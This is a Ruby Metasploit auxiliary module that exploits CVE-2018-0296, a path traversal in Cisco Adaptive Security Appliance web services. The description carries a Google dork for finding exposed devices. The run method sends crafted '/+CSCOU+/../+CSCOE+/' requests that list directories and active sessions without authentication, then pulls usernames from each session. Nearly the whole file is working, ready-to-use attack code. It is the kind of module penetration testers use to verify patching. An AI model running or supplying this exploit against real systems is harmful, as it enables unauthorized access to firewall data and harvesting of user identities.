require 'msf/core'

  class MetasploitModule < Msf::Auxiliary

    include Msf::Exploit::Remote::HttpClient

        def initialize(info={})
      super(update_info(info,
          'Name'           => "Cisco Adaptive Security Appliance  - Path Traversal",
          'Description'    => %q{
            Cisco Adaptive Security Appliance - Path Traversal (CVE-2018-0296)
        A security vulnerability in Cisco ASA that would allow an attacker to view sensitive system information without authentication by using directory traversal techniques.
        Google Dork:inurl:+CSCOE+/logon.html
          },
          'License'        => MSF_LICENSE,
          'Author'         =>
        [
            'Yassine Aboukir',   #Initial  discovery
            'Angelo Ruwantha @h3llwings'      #msf module
        ],
          'References'     =>
        [
            ['EDB', '44956'],
            ['URL', 'https://www.exploit-db.com/exploits/44956/']
        ],
          'Arch'           => ARCH_CMD,
         'Compat'          =>
        {
            'PayloadType' => 'cmd'
        },
          'Platform'       => ['unix','linux'],
          'Targets'        =>
        [
            ['3000 Series Industrial Security Appliance (ISA)
          ASA 1000V Cloud Firewall
          ASA 5500 Series Adaptive Security Appliances
          ASA 5500-X Series Next-Generation Firewalls
          ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers
          Adaptive Security Virtual Appliance (ASAv)
          Firepower 2100 Series Security Appliance
          Firepower 4100 Series Security Appliance
          Firepower 9300 ASA Security Module
          FTD Virtual (FTDv)', {}]
        ],
          'Privileged'     => false,
          'DefaultTarget'  => 0))

        register_options(
        [
          OptString.new('TARGETURI', [true, 'Ex: https://vpn.example.com', '/']),
          OptString.new('SSL', [true, 'set it as true', 'true']),
          OptString.new('RPORT', [true, '443', '443']),
        ], self.class)
    end


    def run
      uri = target_uri.path

      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(uri, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/'),

      })


      if res && res.code == 200 && res.body.include?("{'name'")
        print_good("#{peer} is Vulnerable")
        print_status("Directory Index ")
        print_good(res.body)
             res_dir = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(uri, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b'),

        })
        res_users = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(uri, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'),

        })
        userIDs=res_users.body.scan(/[0-9]\w+/).flatten

        print_status("CSCEO Directory ")
        print_good(res_dir.body)

        print_status("Active Session(s) ")
        print_status(res_users.body)
        x=0
        begin
        print_status("Getting User(s)")
        while (x<=userIDs.length)
          users = send_request_cgi({
          'method'   => 'GET',
          'uri'      => normalize_uri(uri, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'+userIDs[x]),

          })

          grab_username=users.body.scan(/user:\w+/)
          nonstr=grab_username
          if (!nonstr.nil? && nonstr!="")
            print_good("#{nonstr}")
          end
          x=x+1
        end
        rescue
          print_status("Complete")
        end


      else
        print_error("safe")
        return Exploit::CheckCode::Safe
      end
    end
  end